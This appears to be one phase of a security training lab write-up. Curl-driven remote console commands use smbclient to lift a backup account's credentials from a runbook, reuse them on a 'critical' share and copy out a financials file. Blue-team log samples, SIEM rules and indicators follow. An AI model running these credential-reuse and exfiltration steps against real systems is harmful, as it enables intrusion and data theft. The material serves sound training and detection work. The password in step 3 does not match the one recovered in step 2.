# Phase 5 — Privilege escalation and access to the critical share

> Reference scenario — authorized lab use only. See [`../DISCLAIMER.md`](../DISCLAIMER.md).

## Video concept

Privilege escalation (kill chain step 5): reusing a secondary credential
found in a low-privilege location to reach data the current identity cannot
touch — the last step before impact.

## Objective

On the way in (phase 4) the public share's `old-runbook.txt` was readable.
It contains the backup service account. Use it to read the `critical` share —
board notes, financials, the simulated passport-scan folder — and confirm the
blue team's file-access audit fires.

## Attacker steps

```bash
# 1) Pull the decoy runbook from the public share (svc_web can read public):
curl -s -b /tmp/ck.txt -X POST \
  --data-urlencode "cmd=smbclient //10.10.30.11/public -U 'svc_web%Web#Svc2026!' -c 'get old-runbook.txt /tmp/old-runbook.txt; exit'" \
  "http://172.31.100.1/console?token=DEV-2026"

# 2) Read it - the backup account is in there:
curl -s -b /tmp/ck.txt -X POST \
  --data-urlencode "cmd=cat /tmp/old-runbook.txt" \
  "http://172.31.100.1/console?token=DEV-2026"
#   -> fileshare / F1leShare!2026

# 3) Escalate: re-authenticate to the critical share as the backup account:
curl -s -b /tmp/ck.txt -X POST \
  --data-urlencode "cmd=smbclient //10.10.30.11/critical -U 'fileshare%F1leShare!2026!' -c 'ls'" \
  "http://172.31.100.1/console?token=DEV-2026"
#   expected: board-notes.txt, q3-financials.csv, passport-scans/

# 4) Exfiltrate the first file to the web01 foothold (phase 6 ships it out):
curl -s -b /tmp/ck.txt -X POST \
  --data-urlencode "cmd=smbclient //10.10.30.11/critical -U 'fileshare%F1leShare!2026!' -c 'get q3-financials.csv /tmp/q3-financials.csv; exit'" \
  "http://172.31.100.1/console?token=DEV-2026"

curl -s -b /tmp/ck.txt -X POST \
  --data-urlencode "cmd=ls -la /tmp/q3-financials.csv && head -3 /tmp/q3-financials.csv" \
  "http://172.31.100.1/console?token=DEV-2026"
```

## What the blue team sees

| Signal | Where | Sample line | Detection |
|---|---|---|---|
| Critical share read | filesrv audit | `Jan 15 03:04:11 filesrv smbd_audit: fileshare|10.10.10.5|critical|open|ok|q3-financials.csv` | SIEM rule 100920 |
| Share connection from the DMZ | filesrv audit | `... smbd_audit: fileshare|10.10.10.5|critical|connect|ok|critical` | full_audit `connect` op |
| The runbook fetch | filesrv audit | `... smbd_audit: svc_web|10.10.10.5|public|open|ok|old-runbook.txt` | context for the escalation that follows |
| File write onto web01 | web01 app log | `... CONSOLE-EXEC ... cmd=smbclient //10.10.30.11/critical ... get q3-financials.csv ...` | SIEM rule 100911 |

```bash
# Blue-team commands:
docker exec filesrv grep 'critical|open|ok' /var/log/samba/audit.log | tail
docker exec filesrv tail -30 /var/log/samba/audit.log
docker exec filesrv grep 'fileshare|10.10.10.5' /var/log/samba/audit.log | head   # first DMZ use
```

This is the Event-ID-4663 analog the video describes: a sensitive-file read,
attributed to an account, from a source address, at a timestamp — everything
a SOC needs to start the timeline.

## IOC vs IoA box

- **IOC (artifact):** `q3-financials.csv` read from the `critical` share by
  `fileshare` from `10.10.10.5` — and, once hashing is in place, the file's
  hash appearing on any host that should never hold it.
- **IoA (behavior):** share-hopping — `public` read for recon, credential
  extraction, then a `critical` read as a *different* account, all within
  minutes. Each event is individually plausible; the chain is not.

## Kill chain position

Step 5 — privilege escalation (secondary credential reuse), with the data
access edging into step 8 (impact) territory — the breach now has a victim.
